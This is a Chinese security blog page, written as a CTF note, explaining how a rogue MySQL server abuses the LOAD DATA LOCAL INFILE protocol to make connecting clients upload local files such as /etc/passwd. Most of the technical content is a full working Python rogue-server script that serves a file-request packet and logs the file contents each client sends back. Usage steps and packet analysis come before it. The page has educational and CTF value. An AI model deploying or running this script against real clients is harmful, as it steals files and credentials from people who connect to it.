@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      伪mysql服务器_getFile | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>伪mysql服务器_getFile</h2>
+  <p class="post-date">2019-04-19 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DDCTF中mysql弱口令需要的一个知识点，比赛通道关了，无法复现。这里做个简单的笔记</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>构造伪mysql服务器，根据LOAD DATA INFILE原理，构造特殊Response TABULARW包诱导客户端发送需要的文件。</p>
+<h1 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h1><p>wireshark : <code>port 3306</code><br>终端访问：<code>mysql -uroot -p -h 127.0.0.1</code> // TCP访问</p>
+<p>登录请求包<br><img src="./1.png" alt=""></p>
+<p><code>select * from users;</code><br><img src="./2.png" alt=""></p>
+<p>客户端请求</p>
+<p><code>load local data infile “\etc\passwd” into table test3 fields terminated by ‘\n’;</code><br><img src="./3.png" alt=""></p>
+<p>服务端响应客户端<code>Response Query</code>包中却又带有<code>/etc/passwd</code>文件<br>接着客户端响应服务器发送<code>/etc/passwd</code>内容</p>
+<p><img src="./4.png" alt=""></p>
+<p>所以只要我们伪造的服务器伪造<code>Response TABULARW</code>包中的文件名，并附上我们指定文件就能得到到文件信息</p>
+<blockquote>
+<p>In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement.”，可以看到，客户端读取哪个文件其实并不是自己说了算的，是服务端说了算的，</p>
+</blockquote>
+<p>不一定需要客户端先发送<code>LOAD DATA LOCAL</code>命令。官方文档解释如下A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL”</p>
+<p>客户端具备的条件：<br>具有CLILENT_LOCAL_FILES属性</p>
+<h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><ol>
+<li>关闭本地<code>mysql</code>服务器</li>
+</ol>
+<p><code>rogue_mysql_server</code>脚本端口设置多少就是主机mysql连接的端口</p>
+<ol start="2">
+<li><p>运行脚本<br><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+</li>
+<li><p>终端输入mysql -uroot -p -h 127.0.0.1 -P 3306</p>
+</li>
+</ol>
+<p><img src="./5.png" alt=""></p>
+<ol start="4">
+<li><code>cat /etc/passwd</code>得到信息<br><img src="./6.png" alt=""></li>
+</ol>
+<h1 id="具体服务"><a href="#具体服务" class="headerlink" title="具体服务"></a>具体服务</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntpl</span><br></pre></td></tr></table></figure>
+
+<p><img src="./7.png" alt=""></p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>#!/usr/bin/env python<br>#coding: utf8</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">log.setLevel(logging.INFO)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(<span class="string">'mysql.log'</span>, <span class="string">'ab'</span>)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">"%(asctime)s:%(levelname)s:%(message)s"</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line">    <span class="string">'/etc/passwd'</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Gifts'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">        warnings.warn(<span class="string">'Cant create daemon on non-posix system'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.open(<span class="string">'/dev/null'</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span><span class="params">(object)</span>:</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">'&lt;Hbb'</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">'&lt;Hbbb'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, packet_type, payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">"&#123;0&#125;&#123;1&#125;"</span>.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> repr(str(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">        packet_num = ord(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span><span class="params">(asynchat.async_chat)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">'LEN'</span></span><br><span class="line">        self.sub_state = <span class="string">'Auth'</span></span><br><span class="line">        self.logined = <span class="literal">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">""</span>.join((</span><br><span class="line">                    <span class="string">'\x0a'</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">'5.6.28-0ubuntu0.14.04.1'</span> + <span class="string">'\0'</span>,</span><br><span class="line">                    <span class="string">'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00'</span>,</span><br><span class="line">                ))            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">'LOGIN'</span>, <span class="string">'CAPS'</span>, <span class="string">'ANY'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Pushed: %r'</span>, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Data recved: %r'</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'LEN'</span>:</span><br><span class="line">            len_bytes = ord(data[<span class="number">0</span>]) + <span class="number">256</span>*ord(data[<span class="number">1</span>]) + <span class="number">65536</span>*ord(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'MoreLength'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'MoreLength'</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">'\0'</span>:</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'Data'</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x03'</span>:</span><br><span class="line">                        log.info(<span class="string">'Query'</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xFB&#123;0&#125;'</span>.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">'LEN'</span></span><br><span class="line">                        self.sub_state = <span class="string">'File'</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x1b'</span>:</span><br><span class="line">                        log.info(<span class="string">'SelectDB'</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xfe\x00\x00\x02\x00'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'\x02'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">'\x00\x01'</span>:</span><br><span class="line">                        self.push(<span class="literal">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">'File'</span>:</span><br><span class="line">                        log.info(<span class="string">'-- result'</span>)</span><br><span class="line">                        log.info(<span class="string">'Result: %r'</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">'\0\0\0\x02\0\0\0'</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">'LEN'</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">'Auth'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">'-- else'</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">'Unknown packet'</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">'Last packet'</span>)</span><br><span class="line">                self.state = <span class="string">'LEN'</span></span><br><span class="line">                self.sub_state = <span class="literal">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">'Out of order'</span>)</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">'Unknown state'</span>)</span><br><span class="line">            self.push(<span class="string">'None'</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span><span class="params">(asyncore.dispatcher)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sock=None)</span>:</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">''</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span><span class="params">(self)</span>:</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            log.info(<span class="string">'Conn from: %r'</span>, pair[<span class="number">1</span>])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line"><span class="comment"># daemonize()</span></span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a></p>
+<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
+<p><a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/internals/en/com-query-response.html</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#WEB安全" >
+    <span class="tag-code">WEB安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/04/17/%E6%9D%AD%E5%B7%9E%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web%E9%A2%98%E8%A7%A3/">
+        <span class="nav-arrow">← </span>
+        
+          杭州西湖论剑_web题解
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/04/25/PHP%E7%B1%BB%E5%AD%A6%E4%B9%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">
+        
+          PHP类学习_魔术方法
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
